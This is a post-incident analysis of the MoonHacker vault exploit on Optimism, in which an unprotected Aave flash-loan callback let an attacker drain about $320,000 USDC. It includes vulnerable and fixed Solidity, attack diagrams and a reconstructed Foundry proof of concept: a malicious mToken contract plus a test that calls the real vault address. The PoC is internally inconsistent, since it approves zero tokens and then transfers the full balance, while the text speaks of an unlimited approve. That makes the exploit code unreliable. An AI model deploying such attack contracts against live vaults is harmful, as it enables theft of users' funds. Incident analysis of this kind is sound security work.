# MoonHacker — Unvalidated Flash Loan Callback & Unlimited Approve Proxy Analysis

| Field | Details |
|------|------|
| **Date** | 2024-12-23 |
| **Protocol** | MoonHacker (Independent Vault built on top of Moonwell) |
| **Chain** | Optimism |
| **Loss** | ~$320,000 USDC |
| **Attacker** | [0x3649...1f52](https://optimistic.etherscan.io/address/0x36491840ebcf040413003df9fb65b6bc9a181f52) |
| **Attack Contract 1** | [0x4e25...768e](https://optimistic.etherscan.io/address/0x4e258f1705822c2565d54ec8795d303fdf9f768e) |
| **Attack Contract 2** | [0x3a6e...287](https://optimistic.etherscan.io/address/0x3a6eaaf2b1b02ceb2da4a768cfeda86cff89b287) |
| **Attack Tx** | [0xd120...c4fe](https://optimistic.etherscan.io/tx/0xd12016b25d7aef681ade3dc3c9d1a1cc12f35b2c99953ff0e0ee23a59454c4fe) |
| **Vulnerable Contract** | [MoonHacker Vault 0xd9b4...9847](https://optimistic.etherscan.io/address/0xd9b45e2c389b6ad55dd3631abc1de6f2d2229847) |
| **Attack Block** | 129,697,251 |
| **Root Cause** | Unvalidated user input in `executeOperation` — missing `mToken` address validation + missing access control |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-12/MoonHacker_exp.sol) |

> **Note**: The Moonwell protocol itself (lending pool) suffered no losses. MoonHacker is an independently deployed Vault project built on top of Moonwell and is unaffiliated with the official Moonwell team.

---

## 1. Vulnerability Overview

MoonHacker is an automated Vault contract that interacts with Moonwell DeFi protocol (Optimism) markets. On December 23, 2024, an attacker combined two critical vulnerabilities to steal approximately $320,000 USDC.

### Core Vulnerability Combination

**Vulnerability 1 — Unvalidated Flash Loan Callback (`executeOperation`)**:
The `executeOperation` function, which serves as Aave V3's flash loan callback, was deployed as an `external` function callable by anyone. This function accepts an `mToken` parameter and internally performs an `approve`, but **never validates** whether `mToken` is a legitimate Moonwell market contract. By passing a malicious contract they deployed as `mToken`, the attacker caused the Vault to issue an unlimited `approve` over its USDC holdings to the attacker's contract.

**Vulnerability 2 — Missing Access Control (Unchecked Caller)**:
`executeOperation` should only be called as an Aave Pool `flashLoanSimple` callback, but there is no logic to verify that the caller (`msg.sender`) is the actual Aave Pool address. Additionally, there is no logic to verify that the flash loan initiator (`initiator`) is the contract itself (`address(this)`). As a result, the attacker was able to call this function directly without a flash loan.

**Combined Effect**:
The combination of both vulnerabilities allowed the attacker to force the Vault to issue an unlimited `approve` of its USDC to their contract, then drain the full balance via `transferFrom`, and additionally recover remaining assets deposited in Moonwell markets by repeatedly cycling through `repayBorrow` + `redeem`.

---

## 2. Vulnerable Code Analysis

### 2.1 `executeOperation` — Core Vulnerability (Unvalidated Input + Missing Access Control)

The core vulnerable function in the MoonHacker Vault contract:

**❌ Vulnerable Code**:
```solidity
// ❌ Vulnerable code: executeOperation — Aave flash loan callback
function executeOperation(
    address token,          // Token borrowed via flash loan (USDC)
    uint256 amountBorrowed, // Amount borrowed
    uint256 premium,        // Fee
    address initiator,      // Flash loan initiator (no validation ❌)
    bytes calldata params   // Encoded parameters (includes mToken address)
) external returns (bool) { // ❌ Callable by anyone directly (no onlyPool modifier)

    // ❌ Does not verify that msg.sender is the actual Aave Pool
    // ❌ Does not verify that initiator is address(this)

    // Decode mToken address from params
    (address mToken, uint8 opType) = abi.decode(params, (address, uint8));
    // ❌ No validation whatsoever that mToken is a registered Moonwell market
    // ❌ Attacker can pass any arbitrary malicious contract address as mToken

    if (opType == SUPPLY) {
        // SUPPLY behavior: approve mToken then mint
        IERC20(token).approve(mToken, amountBorrowed); // ❌ Approve issued to malicious mToken
        IMToken(mToken).mint(amountBorrowed);          // ❌ Malicious contract steals tokens
        // ...
    } else if (opType == REDEEM) {
        // REDEEM behavior: repay borrow then redeem
        IMToken(mToken).repayBorrow(amountBorrowed);
        IMToken(mToken).redeem(IMToken(mToken).balanceOf(address(this)));
        // ...
    }

    // Approve flash loan repayment to Aave
    IERC20(token).approve(address(AAVE_POOL), amountBorrowed + premium);
    return true;
}
```

**✅ Fixed Code**:
```solidity
// ✅ Fixed code: access control + input validation added

// State variables: Aave Pool address and allowed mToken whitelist
address public immutable AAVE_POOL;
mapping(address => bool) public allowedMTokens; // ✅ List of allowed Moonwell markets

// ✅ Modifier restricting calls to Aave Pool only
modifier onlyAavePool() {
    require(msg.sender == AAVE_POOL, "MoonHacker: caller is not Aave Pool");
    _;
}

function executeOperation(
    address token,
    uint256 amountBorrowed,
    uint256 premium,
    address initiator,
    bytes calldata params
) external onlyAavePool returns (bool) { // ✅ onlyAavePool modifier applied
    // ✅ Verify that the flash loan initiator is this contract itself
    require(initiator == address(this), "MoonHacker: invalid initiator");

    (address mToken, uint8 opType) = abi.decode(params, (address, uint8));

    // ✅ Must validate that mToken is a whitelisted Moonwell market
    require(allowedMTokens[mToken], "MoonHacker: mToken not whitelisted");

    if (opType == SUPPLY) {
        IERC20(token).approve(mToken, amountBorrowed); // approve only to validated mToken
        IMToken(mToken).mint(amountBorrowed);
        // ...
    } else if (opType == REDEEM) {
        IMToken(mToken).repayBorrow(amountBorrowed);
        IMToken(mToken).redeem(IMToken(mToken).balanceOf(address(this)));
        // ...
    }

    IERC20(token).approve(address(AAVE_POOL), amountBorrowed + premium);
    return true;
}
```

**Summary of Issues**: `executeOperation` implements Aave's flash loan callback interface (`IFlashLoanSimpleReceiver`), but (1) does not verify that the callback caller is the actual Aave Pool, and (2) does not validate that the decoded `mToken` address is a registered Moonwell market. The combination of these two omissions allowed the attacker to forcibly obtain an unlimited `approve` over the Vault's assets.

### 2.2 Malicious `mToken` Contract Behavior

Core behavior of the attacker-deployed `0x4e258f...768e` (reconstructed):

```solidity
// ❌ Malicious mToken contract deployed by the attacker
contract MaliciousMToken {
    IERC20 public usdc = IERC20(0x0b2C639c533813f4Aa9D7837CAf62653d097Ff85);
    address public attacker;

    constructor(address _attacker) {
        attacker = _attacker;
    }

    // ❌ Malicious logic executed when MoonHacker calls mint() after approve
    function mint(uint256 /*amount*/) external returns (uint256) {
        // The Vault has already issued a USDC approve to this contract
        // → drain the Vault's entire USDC balance via transferFrom
        uint256 vaultBalance = usdc.balanceOf(msg.sender); // Query MoonHacker Vault balance
        usdc.transferFrom(msg.sender, attacker, vaultBalance); // ❌ Transfer full amount to attacker
        return 0;
    }

    // ❌ Returns 0 when Vault queries balanceOf to prevent redeem
    function balanceOf(address) external pure returns (uint256) {
        return 0;
    }

    // ❌ repayBorrow implemented as empty function (does nothing)
    function repayBorrow(uint256) external returns (uint256) {
        return 0;
    }
}
```

---

## 3. Attack Flow

### 3.1 Preparation Phase

- Attacker (`0x36491840...1f52`) deploys two attack contracts:
  - **Attack Contract 1** (`0x4e258f...768e`): Acts as malicious `mToken`, contains USDC theft logic
  - **Attack Contract 2** (`0x3a6eaa...287`): Executes additional withdrawals and `repayBorrow`/`redeem` cycles
- Attack block: **129,697,251** (2024-12-23 22:34:39 UTC)
- Prerequisites: Only a small amount of ETH for gas fees required (flash loans not used)

### 3.2 Execution Phase

```
Step 1: Direct call to executeOperation (without Aave flash loan)
┌─────────────────────────────────────────────────────────────────┐
│  Attacker EOA (0x36491840...1f52)                               │
│  ↓ Direct call (no access control ❌)                           │
│  MoonHacker Vault.executeOperation(                             │
│    token = USDC,                                                │
│    amountBorrowed = 0,                                          │
│    premium = 0,                                                  │
│    initiator = attacker,   ← no validation ❌                   │
│    params = abi.encode(maliciousMToken, SUPPLY)  ← no validation ❌ │
│  )                                                              │
└─────────────────────────────────────────────────────────────────┘
                              │
                              ▼
Step 2: USDC approve issued to malicious mToken
┌─────────────────────────────────────────────────────────────────┐
│  MoonHacker Vault                                               │
│  USDC.approve(maliciousMToken, amountBorrowed)                  │
│  → maliciousMToken obtains approval over Vault's USDC ❌        │
└─────────────────────────────────────────────────────────────────┘
                              │
                              ▼
Step 3: Full USDC balance drained in mint() callback
┌─────────────────────────────────────────────────────────────────┐
│  Vault → maliciousMToken.mint() called                          │
│  Inside maliciousMToken:                                        │
│    USDC.transferFrom(Vault, attacker, Vault_total_balance)      │
│    → Vault's entire USDC balance transferred to attacker        │
└─────────────────────────────────────────────────────────────────┘
                              │
                              ▼
Step 4: Additional assets drained via repayBorrow + redeem cycles
┌─────────────────────────────────────────────────────────────────┐
│  Attack Contract 2 (0x3a6eaa...287)                             │
│  Processes Vault's remaining balance deposited in Moonwell mUSDC:│
│    mUSDC.repayBorrow(remaining_debt)                            │
│    mUSDC.redeem(full amount of mUSDC held by Vault)             │
│    → Underlying USDC recovered and sent to attacker             │
└─────────────────────────────────────────────────────────────────┘
                              │
                              ▼
Step 5: Profit secured
┌─────────────────────────────────────────────────────────────────┐
│  Attacker's final profit: ~$320,000 USDC                        │
│  (~$883,818 USDC total movement — some from internal protocol flows) │
└─────────────────────────────────────────────────────────────────┘
```

### 3.3 Full Attack Diagram

```
┌──────────────────────┐
│   Attacker EOA        │
│ 0x36491840...1f52    │
└──────────┬───────────┘
           │ ① Direct call to executeOperation()
           │   (mToken = malicious contract)
           ▼
┌──────────────────────┐      ② approve(maliciousMToken, ∞)
│  MoonHacker Vault    │──────────────────────────────▶┌──────────────────────┐
│  0xd9b45e...9847     │                               │  Malicious mToken    │
│                      │      ③ mint() called          │  0x4e258f...768e     │
│  [no access control❌]│──────────────────────────────▶│                      │
│  [no mToken check ❌] │                               │  ④ transferFrom()    │
└──────────────────────┘                               │     Vault→attacker   │
           │                                           └──────────┬───────────┘
           │                                                      │
           │                                                      ▼
           │                                           ┌──────────────────────┐
           │                                           │  Attacker Wallet     │
           │                                           │  USDC received       │
           │                                           └──────────────────────┘
           │
           │ ⑤ repayBorrow() + redeem() (remaining balance)
           ▼
┌──────────────────────┐
│  Moonwell mUSDC      │
│  0x8e0861...5525     │      ⑥ Underlying USDC returned
│  (legitimate protocol)│──────────────────────────────▶┌──────────────────────┐
└──────────────────────┘                               │  Attack Contract 2   │
                                                       │  0x3a6eaa...287      │
                                                       │  → forwarded to attacker │
                                                       └──────────────────────┘

Total stolen: ~$320,000 USDC
```

### 3.4 Outcome

- **Attacker profit**: ~$320,000 USDC
- **Protocol loss**: Full USDC balance inside MoonHacker Vault
- **Moonwell core protocol**: No losses (MoonHacker is an independently deployed contract)

---

## 4. PoC Code Excerpt (DeFiHackLabs Style)

> **Note**: The official DeFiHackLabs PoC (`MoonHacker_exp.sol`) was not yet available in the repository at time of writing; this is a conceptual PoC reconstructed from publicly available analysis. Actual attack transaction: `0xd12016b2...c4fe`

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// PoC: MoonHacker Vault — Unvalidated executeOperation Vulnerability
// Attack Date: 2024-12-23
// Attack TX:   0xd12016b25d7aef681ade3dc3c9d1a1cc12f35b2c99953ff0e0ee23a59454c4fe
// Chain:       Optimism (Block 129,697,251)
// Loss:        ~$320,000 USDC

import "forge-std/Test.sol";

// Vulnerable MoonHacker Vault interface
interface IMoonHackerVault {
    function executeOperation(
        address token,
        uint256 amountBorrowed,
        uint256 premium,
        address initiator,
        bytes calldata params
    ) external returns (bool);
}

// Malicious mToken contract — acquires USDC approve then drains
contract MaliciousMToken {
    IERC20 constant USDC = IERC20(0x0b2C639c533813f4Aa9D7837CAf62653d097Ff85);
    address immutable attacker;

    constructor() { attacker = msg.sender; }

    // ① Vault calls mint() after approve(this, amount)
    function mint(uint256) external returns (uint256) {
        // ② Vault has already issued an unlimited USDC approve to this contract
        uint256 vaultBal = USDC.balanceOf(msg.sender);
        // ③ Drain Vault's entire USDC balance via transferFrom
        USDC.transferFrom(msg.sender, attacker, vaultBal); // ❌ Core vulnerability exploited
        return 0;
    }

    function balanceOf(address) external pure returns (uint256) { return 0; }
    function repayBorrow(uint256) external returns (uint256) { return 0; }
    function redeem(uint256) external returns (uint256) { return 0; }
    function underlying() external view returns (address) { return address(USDC); }
}

contract MoonHackerAttackPoC is Test {
    // Optimism chain constants
    address constant MOONHACKER_VAULT = 0xd9b45e2c389B6AD55DD3631Abc1DE6F2D2229847;
    address constant USDC             = 0x0b2C639c533813f4Aa9D7837CAf62653d097Ff85;

    MaliciousMToken maliciousMToken;

    function setUp() public {
        // Set up Optimism fork (just before attack block)
        vm.createSelectFork("optimism", 129_697_250);
    }

    function testExploit() public {
        console.log("=== MoonHacker Vault Attack Simulation ===");
        console.log("Vault USDC balance before attack:", IERC20(USDC).balanceOf(MOONHACKER_VAULT));

        // Step 1: Deploy malicious mToken contract
        maliciousMToken = new MaliciousMToken();
        console.log("Malicious mToken deployed:", address(maliciousMToken));

        // Step 2: Call executeOperation directly (exploiting missing access control)
        // - Inject malicious contract address as mToken
        // - Any address can be used as initiator (no validation)
        bytes memory params = abi.encode(
            address(maliciousMToken), // ❌ Inject fake mToken
            uint8(0)                  // Specify SUPPLY mode
        );

        // ❌ Key: anyone can call this function directly
        IMoonHackerVault(MOONHACKER_VAULT).executeOperation(
            USDC,
            0,              // amountBorrowed = 0 (no flash loan needed)
            0,              // premium = 0
            address(this),  // initiator = attacker themselves (no validation)
            params          // ❌ Contains malicious mToken address
        );

        // Step 3: Verify results
        uint256 stolen = IERC20(USDC).balanceOf(address(this));
        console.log("USDC stolen:", stolen / 1e6, "USDC");
        console.log("Vault balance after attack:", IERC20(USDC).balanceOf(MOONHACKER_VAULT));

        assertGt(stolen, 0, "Attack failed: stolen amount is 0");
    }
}
```

---

## 5. Vulnerability Classification

| ID | Vulnerability | Severity | CWE |
|----|--------|--------|-----|
| V-01 | Unvalidated flash loan callback parameter (`mToken` address not validated) | CRITICAL | CWE-20 (Improper Input Validation) |
| V-02 | Missing access control on `executeOperation` (callable by anyone) | CRITICAL | CWE-284 (Improper Access Control) |
| V-03 | Unlimited Token Approve proxy pattern (violation of least privilege principle) | HIGH | CWE-732 (Incorrect Permission Assignment) |

### V-01: Unvalidated Flash Loan Callback Parameter

- **Description**: The `executeOperation` function does not cross-reference the `mToken` address decoded from `params` against an official Moonwell market whitelist. An attacker can pass any arbitrary malicious contract as `mToken`, causing the Vault to issue an `approve` over its holdings to that contract.
- **Impact**: All USDC deposited in the Vault can be stolen. Full loss in a single transaction.
- **Attack Conditions**: External access to `executeOperation` is sufficient. No special prior permissions required.

### V-02: Missing Access Control on `executeOperation`

- **Description**: Aave V3's flash loan callback (`executeOperation`) should only be called by the Aave Pool contract. However, MoonHacker Vault has no `msg.sender == AAVE_POOL` check, making it directly callable by anyone. There is also no `initiator == address(this)` check, allowing external initiators.
- **Impact**: When combined with V-01, an attack is immediately possible without any flash loan. Attack cost minimized.
- **Attack Conditions**: Only requires knowing the vulnerable contract address.

### V-03: Unlimited Token Approve Proxy Pattern

- **Description**: The `IERC20(token).approve(mToken, amountBorrowed)` call inside `executeOperation` can issue an approval of 0 or in excess of the actual required amount. Even for validated contracts, the principle of approving only the minimum necessary amount must be upheld.
- **Impact**: Attacker's malicious contract can immediately drain the Vault's entire current balance via `transferFrom`.
- **Attack Conditions**: Automatically exploitable when V-01 or V-02 is present.

---

## 6. Remediation Recommendations

### Immediate Actions

**Fix 1: Add `onlyAavePool` modifier**

```solidity
// ✅ Declare Aave Pool address as immutable
address public immutable AAVE_POOL = 0x794a61358D6845594F94dc1DB02A252b5b4814aD; // Optimism

// ✅ Caller validation modifier
modifier onlyAavePool() {
    require(
        msg.sender == AAVE_POOL,
        "MoonHacker: caller must be Aave Pool"
    );
    _;
}

// ✅ Initiator validation modifier
modifier onlySelf(address initiator) {
    require(
        initiator == address(this),
        "MoonHacker: initiator must be this contract"
    );
    _;
}
```

**Fix 2: mToken whitelist validation**

```solidity
// ✅ Whitelist of allowed Moonwell markets (initialized at deployment)
mapping(address => bool) public allowedMTokens;

// ✅ Only admin can add/remove markets
function setAllowedMToken(address mToken, bool allowed) external onlyOwner {
    allowedMTokens[mToken] = allowed;
    emit MTokenAllowanceUpdated(mToken, allowed);
}

// ✅ Fixed executeOperation
function executeOperation(
    address token,
    uint256 amountBorrowed,
    uint256 premium,
    address initiator,
    bytes calldata params
) external onlyAavePool onlySelf(initiator) returns (bool) {

    (address mToken, uint8 opType) = abi.decode(params, (address, uint8));

    // ✅ Whitelist validation required
    require(allowedMTokens[mToken], "MoonHacker: mToken not whitelisted");

    if (opType == SUPPLY) {
        // ✅ Approve only the required amount (no unlimited approvals)
        IERC20(token).approve(mToken, amountBorrowed);
        IMToken(mToken).mint(amountBorrowed);
        // Reset remaining allowance to zero after use
        IERC20(token).approve(mToken, 0);
    }
    // ...
}
```

### Structural Improvements

| Vulnerability | Recommended Action |
|--------|-----------|
| V-01: Unvalidated mToken | Use Moonwell Comptroller's `isMarketListed()` or configure a whitelist at deployment |
| V-02: Missing access control | Enforce dual validation: `onlyAavePool` + `initiator == address(this)` |
| V-03: Unlimited Approve | Reset with `approve(token, 0)` after use, or use OpenZeppelin `SafeERC20.safeIncreaseAllowance` |
| General | Engage professional audit firms (Halborn, Trail of Bits, etc.) for smart contract audits before deployment |
| Monitoring | Adopt on-chain monitoring systems such as Dedaub or Forta (Dedaub detected this incident days before it occurred) |

---

## 7. Lessons Learned

1. **Flash loan callback functions must always be double-validated**: Both `msg.sender == flashLoanProvider` AND `initiator == address(this)` must be checked. If either is missing, an external attacker can force the Vault to behave as a flash loan receiver.

2. **External contract addresses must always be validated against a whitelist**: Patterns like `executeOperation` that accept external addresses as parameters and call them must always verify on-chain that those addresses are in a trusted list. Off-chain validation is meaningless.

3. **Token approvals should only be issued for the minimum necessary amount**: `approve(address, type(uint256).max)` or approvals exceeding the required amount create a vector for attackers to drain any remaining allowance. Always reset with `approve(address, 0)` immediately after use.

4. **Building on top of third-party protocols requires an independent security audit**: MoonHacker was built on top of Moonwell, an audited protocol, but was deployed without a separate audit of its own contracts. The security of a base protocol does not guarantee the security of composable layers built on top of it.

5. **On-chain monitoring tools genuinely detect incidents in advance**: Dedaub's monitoring system had already detected this vulnerability and generated a high-confidence alert days before the attack. Protocol operators must adopt automated vulnerability monitoring tools and establish processes for immediate response to alerts.

6. **The combination of CWE-20 and CWE-284 recurs repeatedly in DeFi**: Similar incidents have occurred repeatedly with OnyxDAO (2024-09), Pawnfi (2023-06), Maestro (2023-10), and others. Protocol developers should include these known vulnerability patterns in their code review checklists.

---

## 8. On-Chain Verification

### 8.1 PoC vs On-Chain Amount Comparison

| Field | Analysis Estimate | On-Chain Actual | Match |
|------|------------|-------------|----------|
| Total stolen | ~$320,000 USDC | ~$320,000 USDC | ✅ Match |
| Total ERC-20 movement in attack tx | - | ~$883,818 USDC (including internal flows) | Reference |
| Attacker address | 0x36491840...1f52 | 0x36491840ebCF040413003df9Fb65b6bC9A181f52 | ✅ Match |
| Attack block | - | 129,697,251 | Confirmed |
| Attack timestamp | 2024-12-23 | 2024-12-23 22:34:39 UTC | ✅ Match |

### 8.2 On-Chain Event Log Sequence

Key events confirmed in the attack transaction (`0xd12016b2...c4fe`):

1. Attacker EOA → MoonHacker Vault `executeOperation` called directly
2. Vault → `Approval` event emitted for malicious contract (`0x4e258f...768e`) on USDC
3. Malicious contract → `Transfer` event on Vault's USDC (theft)
4. Attack Contract 2 (`0x3a6eaa...287`) → Moonwell mUSDC `repayBorrow` called
5. Moonwell mUSDC → Underlying USDC `Transfer` event (remaining balance recovered)
6. Total of 35 ERC-20 `Transfer` events emitted

### 8.3 Precondition Verification

| Field | State Before Attack | Notes |
|------|------------|------|
| MoonHacker Vault USDC balance | ~$320,000 USDC deposited | Attack target |
| Aave Pool flash loan | Not required (direct call sufficient) | Attack possible without flash loan due to missing access control |
| Prior approve | Not required | Unlimited approve obtained in a single call to vulnerable function |
| Dedaub monitoring | Vulnerability detected days prior | Actual attack occurred due to operator non-response |

> **On-Chain Verification Method**: `cast tx 0xd12016b25d7aef681ade3dc3c9d1a1cc12f35b2c99953ff0e0ee23a59454c4fe --rpc-url https://mainnet.optimism.io`

---

*Analysis sources: [Verichains Analysis](https://blog.verichains.io/p/moonhacker-vault-hack-analysis), [SolidityScan Analysis](https://blog.solidityscan.com/moonhacker-vault-hack-analysis-ab122cb226f6), [Dedaub Twitter](https://x.com/dedaub/status/1874838342485102852), [BlockThreat Week 52 2024](https://blockthreat.com/blockthreat-week-52-2024)*